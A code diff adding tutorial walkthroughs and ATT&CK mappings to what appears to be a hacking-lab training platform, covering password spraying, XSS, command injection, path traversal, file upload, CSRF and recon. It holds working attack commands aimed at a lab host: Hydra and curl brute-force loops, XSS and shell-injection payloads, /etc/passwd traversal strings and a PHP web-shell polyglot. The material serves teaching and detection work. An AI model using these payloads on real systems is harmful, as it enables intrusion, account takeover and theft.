@@ -413,17 +413,21 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
                 {"title": "Enumerate likely usernames",
                  "event_types": ["login_failed", "login_success"],
                  "min_count": 4,
-                 "explain":     "Submit 4+ different usernames with the same trial password."},
+                 "explain":     "Submit at least 4 different usernames with the same trial password."},
                 {"title": "Detect username enumeration leak",
                  "event_types": ["login_failed"],
                  "min_count": 6,
-                 "explain":     "Compare error messages between known and unknown users."},
+                 "explain":     "Send at least 6 failed logins, comparing the error message between "
+                                "known and unknown users — the wording leaks which accounts exist."},
                 {"title": "Trigger pattern detection",
                  "event_types": ["brute_force_pattern"],
-                 "explain":     "After 3+ failures from your IP the pattern event fires."},
+                 "explain":     "Make 3+ failed login attempts from your client — the brute-force "
+                                "pattern event fires automatically once the threshold is crossed."},
                 {"title": "Discover a working credential",
                  "event_types": ["credential_found"],
-                 "explain":     "One of the candidate usernames will share the spray password."},
+                 "explain":     "Keep spraying — one candidate username shares the spray password. "
+                                "Completing the mission needs BOTH the pattern (volume) AND a valid login, "
+                                "so don't stop at the first success: a real spray is noisy by design."},
             ],
             "success_event_types": ["brute_force_pattern", "credential_found"],
             "ideal_commands": [
@@ -959,6 +963,929 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
 }
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  WALKTHROUGH — TryHackMe-style teaching content per variant.
+#
+#  For each (module_id, variant_id) we provide:
+#    overview  — 2-4 sentences: what this attack is + how it works overall.
+#    sections  — list aligned BY INDEX with the variant's `tasks`. Each:
+#        what     — what this step is / the concept behind it
+#        how      — how it's actually done (method + concrete command)
+#        look_for — the observable signal that proves the step worked
+#
+#  compute() merges these into each task so the guided UI can render a
+#  rich, explained walkthrough. Modules without an entry here gracefully
+#  fall back to the task's one-line `explain`.
+# ═══════════════════════════════════════════════════════════════════════════
+WALKTHROUGH: Dict[str, Dict[str, Dict[str, Any]]] = {
+
+    # ─── BRUTE FORCE ────────────────────────────────────────────────────
+    "brute_force": {
+        "password_spray": {
+            "overview": (
+                "Password spraying flips a normal brute-force on its head: instead of "
+                "hammering one account with thousands of passwords (which trips lockouts), "
+                "you try ONE very common password against MANY usernames. Because each "
+                "account only sees a single failed attempt, per-account lockout never "
+                "fires — yet across a big enough user list, someone is always reusing "
+                "'password123'."
+            ),
+            "sections": [
+                {
+                    "what": "Before you can spray, you need a list of usernames that probably exist. "
+                            "Most apps leak this: predictable names (admin, operator, service) and "
+                            "different responses for valid vs invalid users.",
+                    "how":  "Submit a handful of likely usernames with a throwaway password and watch "
+                            "the response. In the lab browser, try logging in as admin, operator, guest, "
+                            "alice, bob, service — one wrong password each.",
+                    "look_for": "Each attempt is logged as a failed login. 4+ distinct usernames marks this step done.",
+                },
+                {
+                    "what": "Username enumeration is a vulnerability on its own: if the app says "
+                            "'wrong password' for real users but 'no such account' for fake ones, "
+                            "it just told you which usernames are real.",
+                    "how":  "Compare the error message between a username you believe is real (admin) "
+                            "and an obviously fake one (zzqq). Note which message means 'this user exists'.",
+                    "look_for": "Two different error strings = the endpoint leaks valid accounts. 6+ attempts marks this done.",
+                },
+                {
+                    "what": "Repeated failed logins from one source are exactly what a SOC watches for. "
+                            "This step proves the attack is noisy and detectable — the blue-team side of the lesson.",
+                    "how":  "Keep spraying. After 3+ failures from your IP inside the detection window, "
+                            "the lab fires a synthetic brute-force-pattern event (mirrors a Wazuh rule).",
+                    "look_for": "A 'Brute-force pattern detected' evidence card appears in the panel.",
+                },
+                {
+                    "what": "The payoff: one of your sprayed users shares the common password. "
+                            "That single 302 redirect is a full account takeover.",
+                    "how":  "When a sprayed username returns success (redirect to /profile/ instead of a "
+                            "401), you've found a live credential. The lab plants admin:password123.",
+                    "look_for": "A 'Valid credential confirmed' card — you successfully logged in.",
+                },
+            ],
+        },
+        "credential_stuffing": {
+            "overview": (
+                "Credential stuffing assumes people reuse passwords. Attackers take "
+                "username/password pairs leaked from OTHER breaches and replay them against "
+                "your login. You're not guessing randomly — you're betting that a known user "
+                "reused a password that already appeared in a public dump like rockyou.txt."
+            ),
+            "sections": [
+                {
+                    "what": "First confirm the login endpoint accepts repeated automated POSTs with no "
+                            "rate limit, CAPTCHA, or lockout — the precondition that makes stuffing viable.",
+                    "how":  "Send one login POST to /auth/login (any password) and confirm you get a clean "
+                            "401 back, not a block or challenge.",
+                    "look_for": "A failed-login event is recorded — the endpoint is reachable and unprotected.",
+                },
+                {
+                    "what": "Now replay a leaked password list against a known account. This is the heart of "
+                            "stuffing: a curated wordlist of real, previously-breached passwords.",
+                    "how":  "Loop a small leaked wordlist against username=admin. From the AttackBox: "
+                            "`while read pw; do curl -s -o /dev/null -w '%{http_code}\\n' -d \"username=admin&password=$pw\" "
+                            "http://target-agent/auth/login; done < /wordlists/rockyou-mini.txt`",
+                    "look_for": "8+ failed-login attempts recorded against admin marks this step done.",
+                },
+                {
+                    "what": "High-volume automated attempts trip detection. Again this shows the defensive "
+                            "signal a real SOC would alert on.",
+                    "how":  "The wordlist loop itself produces enough failures (3+ in the window) to fire "
+                            "the brute-force-pattern detection.",
+                    "look_for": "A 'Brute-force pattern detected' evidence card appears.",
+                },
+                {
+                    "what": "If the reused password is anywhere in the leaked list, you're in — without ever "
+                            "'guessing'. That's why password reuse is so dangerous.",
+                    "how":  "When one password in the list returns a 302 redirect, that's the hit. Confirm it "
+                            "by hand: `curl -i -d 'username=admin&password=password123' http://target-agent/auth/login`.",
+                    "look_for": "A 'Valid credential confirmed' card — the leaked password worked.",
+                },
+            ],
+        },
+        "hydra_targeted": {
+            "overview": (
+                "This is brute-force done with a real tool. THC-Hydra understands HTTP login "
+                "forms: you describe the form (URL, fields, and the failure string), hand it a "
+                "wordlist, and it submits attempts in parallel and stops on the first success. "
+                "It's the fastest, loudest variant — and the most realistic to how forms get cracked."
+            ),
+            "sections": [
+                {
+                    "what": "Hydra needs to know exactly how the form works: the path it POSTs to, the field "
+                            "names, and the text that appears on a FAILED login (so it can tell success from failure).",
+                    "how":  "GET /auth/login and read the HTML form. Identify action=/auth/login, fields "
+                            "username & password, and the failure message ('Incorrect password').",
+                    "look_for": "One probe login is recorded — you've confirmed the form's shape.",
+                },
+                {
+                    "what": "A good wordlist beats a big one. Target the org: company name, year, season, "
+                            "'Welcome1', etc. Hydra will iterate this against your user list.",
+                    "how":  "Run Hydra with the http-post-form module: "
+                            "`hydra -L users.txt -P /wordlists/rockyou-mini.txt target-agent http-post-form "
+                            "'/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 8 -f`",
+                    "look_for": "10+ login attempts recorded as Hydra works through the list.",
+                },
+                {
+                    "what": "Hydra's parallel threads create a burst of failures — the most obvious detection "
+                            "signature of all three variants.",
+                    "how":  "The mass parallel attempts (-t 8) trip the brute-force-pattern detector almost immediately.",
+                    "look_for": "A 'Brute-force pattern detected' evidence card appears.",
+                },
+                {
+                    "what": "With -f, Hydra halts on the first valid pair and prints it. That's your credential, "
+                            "found automatically.",
+                    "how":  "Read Hydra's output line: [80][http-post-form] host: target-agent login: admin password: password123. "
+                            "Verify with a manual curl to be sure.",
+                    "look_for": "A 'Valid credential confirmed' card — Hydra cracked the login.",
+                },
+            ],
+        },
+    },
+
+    # ─── XSS ────────────────────────────────────────────────────────────
+    "xss": {
+        "reflected": {
+            "overview": (
+                "Reflected XSS happens when an app takes input from the request (like a search "
+                "query) and writes it straight back into the HTML response without escaping it. "
+                "If you can get your text into the page verbatim, you can get a <script> tag into "
+                "the page too — and the victim's browser will run it. It's 'reflected' because the "
+                "payload bounces back in the same single response."
+            ),
+            "sections": [
+                {
+                    "what": "Reflection is the precondition for this attack: your input must appear somewhere "
+                            "in the response. First prove the search box echoes what you type.",
+                    "how":  "Search for a unique marker like 'attense_probe'. In the lab browser: "
+                            "/search?q=attense_probe — then look for that word in the results.",
+                    "look_for": "Your marker appears in the page — input is reflected. (search_used event)",
+                },
+                {
+                    "what": "Now test whether HTML is escaped. If you send a script tag and it comes back as "
+                            "raw markup (not &lt;script&gt;), the app is injectable.",
+                    "how":  "Submit a script payload: /search?q=<script>alert(1)</script> "
+                            "(URL-encode if typing in a terminal).",
+                    "look_for": "An 'XSS-shaped payload submitted' card — the app received your script.",
+                },
+                {
+                    "what": "Confirmation: the payload is reflected unescaped, meaning a real browser would "
+                            "execute it. That's a working reflected XSS.",
+                    "how":  "Check the response body contains your <script> tag verbatim — character for "
+                            "character, no entity encoding.",
+                    "look_for": "A 'Reflected input observed' card — the payload rendered unescaped.",
+                },
+            ],
+        },
+        "alternate_context": {
+            "overview": (
+                "Real apps often block the obvious <script> tag. Alternate-context XSS bypasses "
+                "those naive filters using other ways browsers run JavaScript: event handlers "
+                "(onerror, onload) on image/SVG tags, or javascript: URLs. The lesson: blocklists "
+                "are brittle — there are dozens of sinks, and you only need one to survive filtering."
+            ),
+            "sections": [
+                {
+                    "what": "Start by confirming the endpoint still reflects input, so you know any failure "
+                            "later is the filter, not a dead endpoint.",
+                    "how":  "Submit a harmless query: /search?q=test and confirm it's echoed.",
+                    "look_for": "Input is reflected. (search_used event)",
+                },
+                {
+                    "what": "Try several different execution contexts. Each is a distinct filter bypass: "
+                            "an <img> with onerror, an <svg> with onload, and a breakout from an attribute.",
+                    "how":  "Submit three payloads: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, "
+                            "and \"><script>alert(1)</script> — one at a time.",
+                    "look_for": "3 'XSS-shaped payload submitted' cards — you tested multiple vectors.",
+                },
+                {
+                    "what": "Even if <script> is filtered, an event handler usually slips through. Confirm at "
+                            "least one of your vectors reflected unescaped.",
+                    "how":  "Inspect each response — find the payload that came back intact (e.g. the onerror "
+                            "handler) while others were stripped.",
+                    "look_for": "A 'Reflected input observed' card — a bypass succeeded.",
+                },
+            ],
+        },
+        "stored_attempt": {
+            "overview": (
+                "Stored XSS is the dangerous cousin of reflected XSS: instead of bouncing back in "
+                "one response, the payload is SAVED by the app (in a profile bio, a comment, a name) "
+                "and runs every time anyone views that page. One injection, many victims, no link to "
+                "click. Here you'll try to persist a payload through the profile and see it fire on a "
+                "second, separate request."
+            ),
+            "sections": [
+                {
+                    "what": "Stored XSS needs a place to store data. Authenticate so you can edit a persistent "
+                            "field — your profile.",
+                    "how":  "Log in with valid credentials (admin:password123) so the profile becomes editable.",
+                    "look_for": "A 'Successful login observed' card.",
+                },
+                {
+                    "what": "Inject the payload into a field that gets saved and re-displayed, like the profile "
+                            "email/bio — not just a transient search box.",
+                    "how":  "POST /profile/update with a script payload in the email/bio field, e.g. "
+                            "email=<script>alert(1)</script>@evil.lab.",
+                    "look_for": "Both a payload-submitted and profile-update event (2 events) mark this done.",
+                },
+                {
+                    "what": "The defining test of STORED XSS: the payload must reappear on a fresh page load, "
+                            "proving it was persisted server-side rather than just reflected.",
+                    "how":  "Reload /profile/ in a new request and check the saved payload is still there, unescaped.",
+                    "look_for": "A 'Reflected input observed' card on the second request — the payload persisted.",
+                },
+            ],
+        },
+    },
+
+    # ─── COMMAND INJECTION ──────────────────────────────────────────────
+    "cmd_injection": {
+        "semicolon_basic": {
+            "overview": (
+                "Command injection happens when an app builds an OS shell command out of user "
+                "input and runs it. The /system/ping diagnostics page takes a host and runs "
+                "`ping <host>` on the server. Because the shell treats ';' as 'end this command, "
+                "start another', you can append your OWN command after the host and the server "
+                "runs both — giving you code execution as the web process."
+            ),
+            "sections": [
+                {
+                    "what": "First understand normal behaviour: the page runs ping against whatever host "
+                            "you give it and shows the output. That output channel is how you'll read your results.",
+                    "how":  "Submit a legitimate host in the lab browser: /system/ping?host=127.0.0.1 and read "
+                            "the ping reply that comes back.",
+                    "look_for": "A 'Diagnostics form used' card — the endpoint accepted your input.",
+                },
+                {
+                    "what": "The semicolon is a shell command separator. If the app doesn't strip it, "
+                            "everything after it runs as a brand-new command.",
+                    "how":  "Append a second command: host=127.0.0.1; id  (use the address bar or curl "
+                            "--data-urlencode 'host=127.0.0.1; id').",
+                    "look_for": "A 'Shell metacharacters observed' card — your separator reached the shell.",
+                },
+                {
+                    "what": "Proof of execution: the output of your injected command (not the ping) appears "
+                            "in the response. Seeing `uid=` means you ran `id` on the server.",
+                    "how":  "Look at the response for command output like 'uid=0(root)' or contents of /etc/passwd.",
+                    "look_for": "A 'Command injection confirmed' card — your command executed.",
+                },
+            ],
+        },
+        "pipe_redirect": {
+            "overview": (
+                "Some apps blocklist the semicolon, so you reach for other shell operators. The "
+                "pipe '|' sends ping's output into another command, '&&' chains a command that runs "
+                "if the first succeeds, and '>' redirects output to a file. Each is a different way "
+                "to smuggle execution past a naive filter that only looked for ';'."
+            ),
+            "sections": [
+                {
+                    "what": "Re-establish the baseline so any later failure is clearly the filter, not a broken page.",
+                    "how":  "Submit /system/ping?host=127.0.0.1 and confirm a normal ping response.",
+                    "look_for": "A 'Diagnostics form used' card.",
+                },
+                {
+                    "what": "Try operators other than ';'. Pipe (|) and AND (&&) are classic semicolon-filter "
+                            "bypasses — you only need one to get through.",
+                    "how":  "Test two: host=127.0.0.1|whoami  and  host=127.0.0.1 && cat /etc/hostname "
+                            "(URL-encode when using curl).",
+                    "look_for": "A 'Shell metacharacters observed' card — an alternative separator slipped past the filter.",
+                },
+                {
+                    "what": "Confirm code execution through the operator that survived — the injected command's "
+                            "output is in the response.",
+                    "how":  "Read the response for the output of whoami / cat (e.g. a username or hostname).",
+                    "look_for": "A 'Command injection confirmed' card.",
+                },
+            ],
+        },
+        "subshell": {
+            "overview": (
+                "The stealthiest variant uses command substitution: $(...) or backticks `...`. The "
+                "shell runs what's inside FIRST and substitutes the result into the outer command — "
+                "no obvious separator like ; or | for a filter to catch. It's the kind of payload "
+                "that bypasses blocklists built only around separator characters."
+            ),
+            "sections": [
+                {
+                    "what": "Confirm the endpoint behaves normally before introducing substitution.",
+                    "how":  "Submit /system/ping?host=127.0.0.1.",
+                    "look_for": "A 'Diagnostics form used' card.",
+                },
+                {
+                    "what": "Inject with substitution. $(id) or `whoami` is evaluated by the shell and its output "
+                            "becomes the 'host' that ping tries to resolve — leaking the result back to you.",
+                    "how":  "Try two forms: host=$(id)  and  host=`whoami`  (URL-encode the special characters).",
+                    "look_for": "A 'Shell metacharacters observed' card — the substitution reached the shell.",
+                },
+                {
+                    "what": "Confirm: the substituted output appears in the response, usually inside a ping error "
+                            "like 'cannot resolve uid=0(root): Name or service not known'.",
+                    "how":  "Read the response for your command's output embedded in the ping/resolve error.",
+                    "look_for": "A 'Command injection confirmed' card.",
+                },
+            ],
+        },
+    },
+
+    # ─── DIR TRAVERSAL ──────────────────────────────────────────────────
+    "dir_traversal": {
+        "plain": {
+            "overview": (
+                "Path traversal (a.k.a. directory traversal) abuses a file-reading feature that "
+                "builds a path from user input. By inserting '../' sequences you climb OUT of the "
+                "intended folder and read arbitrary files on the server — like /etc/passwd. The "
+                "/files/read page is meant to serve docs from one directory; this breaks out of it."
+            ),
+            "sections": [
+                {
+                    "what": "See the feature working as intended first: it reads a file by name from a fixed folder.",
+                    "how":  "Open /files/read?path=readme.txt and read the file's contents in the lab browser.",
+                    "look_for": "A 'File viewer used' card — the reader accepts a path parameter.",
+                },
+                {
+                    "what": "Each '../' moves up one directory. String enough together and you escape the web "
+                            "root entirely into the OS filesystem.",
+                    "how":  "Change the path to climb out: path=../../etc/passwd (add more ../ if needed to reach root).",
+                    "look_for": "A 'Path traversal observed' card — a traversal sequence was detected.",
+                },
+                {
+                    "what": "Proof: the server returns the contents of a sensitive system file it should never expose.",
+                    "how":  "Confirm the response contains lines like 'root:x:0:0:' from /etc/passwd.",
+                    "look_for": "A 'Sensitive file disclosed' card — you read a protected file.",
+                },
+            ],
+        },
+        "encoded": {
+            "overview": (
+                "When a filter strips literal '../', you encode it. %2e is '.', %2f is '/', so "
+                "%2e%2e%2f is '../' after the server URL-decodes it. Double-encoding (%252e) beats "
+                "filters that decode only once. The lesson: blocking a string is not the same as "
+                "understanding the path."
+            ),
+            "sections": [
+                {
+                    "what": "Confirm the reader works so later failures point at the filter, not the endpoint.",
+                    "how":  "Open /files/read?path=readme.txt.",
+                    "look_for": "A 'File viewer used' card.",
+                },
+                {
+                    "what": "Send the traversal URL-encoded so the filter's literal '../' check never matches, but "
+                            "the server still decodes it back to '../' before opening the file.",
+                    "how":  "Try two encodings: path=..%2F..%2Fetc%2Fpasswd  and double-encoded "
+                            "path=%252e%252e%252fetc%252fpasswd.",
+                    "look_for": "A 'Path traversal observed' card — an encoded sequence got through.",
+                },
+                {
+                    "what": "Proof: the decoded path escaped the folder and disclosed a system file.",
+                    "how":  "Confirm /etc/passwd content ('root:x:0:0:') appears in the response.",
+                    "look_for": "A 'Sensitive file disclosed' card.",
+                },
+            ],
+        },
+        "absolute": {
+            "overview": (
+                "Sometimes you don't need '../' at all. If the app naively concatenates or trusts the "
+                "path, handing it an ABSOLUTE path like /etc/passwd skips the traversal entirely. This "
+                "catches apps that carefully strip '../' but forget that '/etc/passwd' is already a full path."
+            ),
+            "sections": [
+                {
+                    "what": "Establish the baseline read behaviour.",
+                    "how":  "Open /files/read?path=readme.txt.",
+                    "look_for": "A 'File viewer used' card.",
+                },
+                {
+                    "what": "Skip the dot-dot dance. Provide a full absolute path and see if the reader opens it "
+                            "directly — many ../-stripping filters miss this.",
+                    "how":  "Set path=/etc/passwd (no ../ at all). Also try path=/etc/hostname.",
+                    "look_for": "A 'Path traversal observed' card — the absolute path was accepted.",
+                },
+                {
+                    "what": "Proof: a sensitive file is disclosed via the absolute path.",
+                    "how":  "Confirm 'root:x:0:0:' (passwd) or the machine hostname appears in the response.",
+                    "look_for": "A 'Sensitive file disclosed' card.",
+                },
+            ],
+        },
+    },
+
+    # ─── FILE UPLOAD ────────────────────────────────────────────────────
+    "file_upload": {
+        "wrong_extension": {
+            "overview": (
+                "Unrestricted file upload lets an attacker put their OWN file on the server. The most "
+                "basic test is the extension check: if the app accepts a .php or .sh file, an attacker "
+                "can upload a web shell and later browse to it to run commands. Here you confirm the "
+                "uploader doesn't validate what kind of file it stores."
+            ),
+            "sections": [
+                {
+                    "what": "Confirm the upload works at all with a harmless file, and note where it gets stored.",
+                    "how":  "Upload a small probe.txt via /files/upload (drag-drop in the browser or "
+                            "curl -F 'file=@probe.txt' http://target-agent/files/upload).",
+                    "look_for": "An 'Upload form used' and 'File saved' card — the file landed on the server.",
+                },
+                {
+                    "what": "Now try a dangerous executable extension. A .php file that the web server would "
+                            "execute is the classic web-shell vector.",
+                    "how":  "Upload shell.php (contents like <?php echo 'x'; ?>). curl -F 'file=@shell.php' "
+                            "http://target-agent/files/upload.",
+                    "look_for": "A 'Dangerous extension accepted' card — the server stored a .php file.",
+                },
+                {
+                    "what": "Proof: the server returns a stored path with no validation — an attacker now has a "
+                            "file they control inside the app.",
+                    "how":  "Confirm the response gives a path under /static/uploads/ for your dangerous file.",
+                    "look_for": "An 'Unrestricted upload confirmed' card.",
+                },
+            ],
+        },
+        "mime_spoof": {
+            "overview": (
+                "Smarter uploaders check the Content-Type header to decide if a file is 'an image'. But "
+                "the client sets that header — so you can lie. Send your .php while claiming "
+                "Content-Type: image/png and a trusting server stores it as if it were a harmless image."
+            ),
+            "sections": [
+                {
+                    "what": "Confirm a genuine image uploads cleanly, establishing what a 'valid' upload looks like.",
+                    "how":  "Upload any real .png/.jpg via /files/upload.",
+                    "look_for": "A 'File saved' card.",
+                },
+                {
+                    "what": "Now spoof the type: send a PHP payload but tag it Content-Type: image/png so a "
+                            "header-only check is fooled.",
+                    "how":  "curl -F 'file=@shell.php;type=image/png' http://target-agent/files/upload.",
+                    "look_for": "A 'Dangerous extension accepted' card — the spoofed MIME slipped through.",
+                },
+                {
+                    "what": "Proof: the executable file was stored despite the fake type — MIME was never truly enforced.",
+                    "how":  "Confirm the response returns a stored path for your disguised .php.",
+                    "look_for": "An 'Unrestricted upload confirmed' card.",
+                },
+            ],
+        },
+        "polyglot": {
+            "overview": (
+                "A polyglot file is valid as TWO formats at once: it begins with real image magic bytes "
+                "(so content-sniffing sees a JPEG) yet also contains a working script payload. This "
+                "defeats servers that check BOTH the file's real bytes AND its extension — the file "
+                "honestly is an image, and also a shell."
+            ),
+            "sections": [
+                {
+                    "what": "Confirm the endpoint accepts uploads before crafting the tricky file.",
+                    "how":  "Upload any baseline file via /files/upload.",
+                    "look_for": "A 'File saved' card.",
+                },
+                {
+                    "what": "Build a polyglot: prepend JPEG magic bytes (\\xff\\xd8\\xff\\xe0) to a PHP payload and "
+                            "save it as poly.jpg.php — it sniffs as an image but runs as PHP.",
+                    "how":  "printf '\\xff\\xd8\\xff\\xe0' > poly.jpg.php; echo '<?php system($_GET[\"c\"]); ?>' "
+                            ">> poly.jpg.php; curl -F 'file=@poly.jpg.php;type=image/jpeg' http://target-agent/files/upload.",
+                    "look_for": "A 'Dangerous extension accepted' card — both checks were beaten.",
+                },
+                {
+                    "what": "Proof: the polyglot was stored — content sniffing AND extension filtering both failed.",
+                    "how":  "Confirm the response returns a stored path for the polyglot.",
+                    "look_for": "An 'Unrestricted upload confirmed' card.",
+                },
+            ],
+        },
+    },
+
+    # ─── CSRF ───────────────────────────────────────────────────────────
+    "csrf": {
+        "basic_forgery": {
+            "overview": (
+                "Cross-Site Request Forgery abuses the fact that browsers auto-send your cookies with "
+                "every request. If a state-changing form (like 'update profile') has no anti-CSRF token, "
+                "any page can submit it on your behalf using your logged-in session. Here you prove the "
+                "profile update accepts a forged POST with no token."
+            ),
+            "sections": [
+                {
+                    "what": "CSRF rides an authenticated session, so first log in and hold the session cookie.",
+                    "how":  "Log in as admin:password123. From a terminal: "
+                            "curl -c /tmp/c.txt -d 'username=admin&password=password123' http://target-agent/auth/login.",
+                    "look_for": "A 'Successful login observed' card.",
+                },
+                {
+                    "what": "Submit the state-changing request WITHOUT any CSRF token — exactly what an attacker's "
+                            "page would do with your cookie.",
+                    "how":  "curl -b /tmp/c.txt -d 'email=pwned@evil.lab' http://target-agent/profile/update.",
+                    "look_for": "A 'Profile update without a CSRF token' card — the server accepted a tokenless change.",
+                },
+                {
+                    "what": "Proof: the change actually persisted, confirming the forgery worked end-to-end.",
+                    "how":  "Re-read the profile: curl -b /tmp/c.txt http://target-agent/profile/ and confirm "
+                            "the email is now pwned@evil.lab.",
+                    "look_for": "A 'Profile changed without CSRF protection' card.",
+                },
+            ],
+        },
+        "lure_page": {
+            "overview": (
+                "This is CSRF as it happens in the wild. The lab ships an attacker page, /evil/csrf-demo, "
+                "that auto-submits a forged profile update the moment a logged-in victim opens it. The "
+                "victim never clicks anything malicious — just visiting the page (while logged in elsewhere) "
+                "is enough to change their account."
+            ),
+            "sections": [
+                {
+                    "what": "Set up the victim: an authenticated session is the precondition for the lure to work.",
+                    "how":  "Log in as admin in the lab browser so you hold a live session.",
+                    "look_for": "A 'Successful login observed' card.",
+                },
+                {
+                    "what": "Open the attacker-controlled page. It contains a hidden form targeting /profile/update "
+                            "that fires automatically — simulating a malicious site you stumbled onto.",
+                    "how":  "Navigate to /evil/csrf-demo in the lab browser while still logged in.",
+                    "look_for": "An 'Attacker lure page visited' card.",
+                },
+                {
+                    "what": "Proof: the lure's auto-submitted request changed your profile silently, using your cookie.",
+                    "how":  "The page auto-submits; then re-open /profile/ and confirm the email changed.",
+                    "look_for": "A 'Forged form submitted' and 'Profile changed without CSRF protection' card.",
+                },
+            ],
+        },
+        "json_bypass": {
+            "overview": (
+                "Some apps add CSRF defences only to form-encoded POSTs and forget about JSON. By sending "
+                "the same state-changing request with Content-Type: application/json, you can slip past a "
+                "filter that only inspects classic form submissions — a subtle but common real-world gap."
+            ),
+            "sections": [
+                {
+                    "what": "Authenticate to get a session, as with any CSRF test.",
+                    "how":  "Log in as admin:password123 and keep the cookie (curl -c /tmp/c.txt ...).",
+                    "look_for": "A 'Successful login observed' card.",
+                },
+                {
+                    "what": "Re-send the profile update as JSON instead of form data. Filters that only guard "
+                            "application/x-www-form-urlencoded won't inspect this.",
+                    "how":  "curl -b /tmp/c.txt -H 'Content-Type: application/json' "
+                            "-d '{\"email\":\"pwned@evil.lab\"}' http://target-agent/profile/update.",
+                    "look_for": "A 'Profile update used' card — the JSON body was accepted.",
+                },
+                {
+                    "what": "Proof: the change persisted, confirming the JSON path bypassed CSRF protection.",
+                    "how":  "Re-read the profile and confirm the email is now pwned@evil.lab.",
+                    "look_for": "A 'Profile changed without CSRF protection' card.",
+                },
+            ],
+        },
+    },
+
+    # ─── RECON ──────────────────────────────────────────────────────────
+    "recon": {
+        "manual": {
+            "overview": (
+                "Reconnaissance is mapping the target before you attack. Manual recon means walking the "
+                "app like a curious user — clicking every link, reading every page — to build a mental "
+                "map of the features and where they might be weak. It's slow but stealthy and teaches you "
+                "the app's real shape."
+            ),
+            "sections": [
+                {
+                    "what": "Start at the front door. The home page usually links to most of the app's features.",
+                    "how":  "Open / in the lab browser and read what's there.",
+                    "look_for": "A 'Portal visited' card.",
+                },
+                {
+                    "what": "Visit the distinct areas the app exposes — search, profile, file viewer, diagnostics. "
+                            "Each is a candidate attack surface for a later module.",
+                    "how":  "Click through to at least 3 areas: /search, /profile/, /files/read, /system/ping.",
+                    "look_for": "Several 'Route discovered' / feature-used cards (3+ areas marks this done).",
+                },
+                {
+                    "what": "Visiting enough distinct areas in sequence trips the lab's recon-sequence detector — "
+                            "the blue-team signature of someone mapping the app.",
+                    "how":  "Keep exploring until you've hit 4+ distinct areas.",
+                    "look_for": "A 'Recon sequence detected' card.",
+                },
+            ],
+        },
+        "wordlist": {
+            "overview": (
+                "Wordlist (or content) discovery finds routes that aren't linked anywhere on the site. "
+                "Tools like gobuster/ffuf hammer the server with a list of common paths and keep the ones "
+                "that return something — uncovering hidden admin panels, demos, and forgotten endpoints "
+                "the developers never advertised."
+            ),
+            "sections": [
+                {
+                    "what": "Confirm the target is up and how it responds to a known-good path, so you can tell hits "
+                            "from misses during the scan.",
+                    "how":  "curl -i http://target-agent/ and note the response.",
+                    "look_for": "A 'Portal visited' card.",
+                },
+                {
+                    "what": "Brute-force paths with a wordlist. Every 200/301/302 is a real route the home page "
+                            "may not link to.",
+                    "how":  "gobuster dir -u http://target-agent -w /usr/share/wordlists/dirb/common.txt -t 20 "
+                            "(or loop curl over a path list), then visit each hit.",
+                    "look_for": "Multiple 'Route discovered' cards (4+ endpoints marks this done).",
+                },
+                {
+                    "what": "The payoff of fuzzing is the hidden stuff — a route or clue not reachable by clicking, "
+                            "like /evil/csrf-demo or /robots.txt.",
+                    "how":  "Request the non-obvious paths your wordlist surfaced and read them.",
+                    "look_for": "A 'Hidden clue accessed' (or lure-visited) card.",
+                },
+            ],
+        },
+        "comment_hunting": {
+            "overview": (
+                "Developers leak secrets in plain sight: HTML comments, version banners, and debug notes "
+                "left in the page source. Comment hunting means reading the raw HTML/JS — not the rendered "
+                "page — for these mistakes. A single '<!-- TODO: remove admin login /secret-admin -->' can "
+                "hand you the whole app."
+            ),
+            "sections": [
+                {
+                    "what": "Grab the raw source of the home page — comments and banners live in the HTML, not the "
+                            "visible page.",
+                    "how":  "curl -s http://target-agent/ and read the full markup.",
+                    "look_for": "A 'Portal visited' card.",
+                },
+                {
+                    "what": "Grep the source for tell-tale leaks: HTML comments, 'Server'/'version' strings, "
+                            "framework banners. These reveal stack details and sometimes hidden URLs.",
+                    "how":  "curl -s http://target-agent/ | grep -iE '<!--|server|version|powered' and inspect "
+                            "headers with curl -sI.",
+                    "look_for": "Several 'Route discovered' / feature cards as you follow the leads.",
+                },
+                {
+                    "what": "Comments often point at something hidden — an admin path, a demo page, a backup. "
+                            "Following the leak uncovers a non-obvious route.",
+                    "how":  "Visit whatever URL or hint the comments disclosed.",
+                    "look_for": "A 'Hidden clue accessed' card.",
+                },
+            ],
+        },
+    },
+}
+
+
+def get_walkthrough(module_id: str, variant_id: Optional[str]) -> Optional[Dict[str, Any]]:
+    """Return the walkthrough entry for (module, variant), defaulting to the
+    first variant when none is supplied. None when no teaching content exists."""
+    mod = WALKTHROUGH.get(module_id)
+    if not mod:
+        return None
+    if not variant_id:
+        variant_id = next(iter(MODULE_VARIANTS.get(module_id, {})), None)
+    return mod.get(variant_id)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  MITRE ATT&CK — one technique per walkthrough section (aligned by index).
+#  Format: "Txxxx[.yyy] · Short technique name". The frontend turns the id
+#  into a clickable attack.mitre.org link so each section is grounded in the
+#  authoritative ATT&CK knowledge base.
+# ═══════════════════════════════════════════════════════════════════════════
+SECTION_TECHNIQUES: Dict[str, Dict[str, List[str]]] = {
+    "brute_force": {
+        "password_spray": [
+            "T1589.001 · Gather Victim Identity Information: Credentials",
+            "T1087 · Account Discovery",
+            "T1110.003 · Brute Force: Password Spraying",
+            "T1078 · Valid Accounts",
+        ],
+        "credential_stuffing": [
+            "T1595 · Active Scanning",
+            "T1110.004 · Brute Force: Credential Stuffing",
+            "T1110 · Brute Force",
+            "T1078 · Valid Accounts",
+        ],
+        "hydra_targeted": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1110.001 · Brute Force: Password Guessing",
+            "T1110 · Brute Force",
+            "T1078 · Valid Accounts",
+        ],
+    },
+    "xss": {
+        "reflected": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1059.007 · Command and Scripting Interpreter: JavaScript",
+            "T1189 · Drive-by Compromise",
+        ],
+        "alternate_context": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1059.007 · Command and Scripting Interpreter: JavaScript",
+            "T1059.007 · Command and Scripting Interpreter: JavaScript",
+        ],
+        "stored_attempt": [
+            "T1078 · Valid Accounts",
+            "T1059.007 · Command and Scripting Interpreter: JavaScript",
+            "T1189 · Drive-by Compromise",
+        ],
+    },
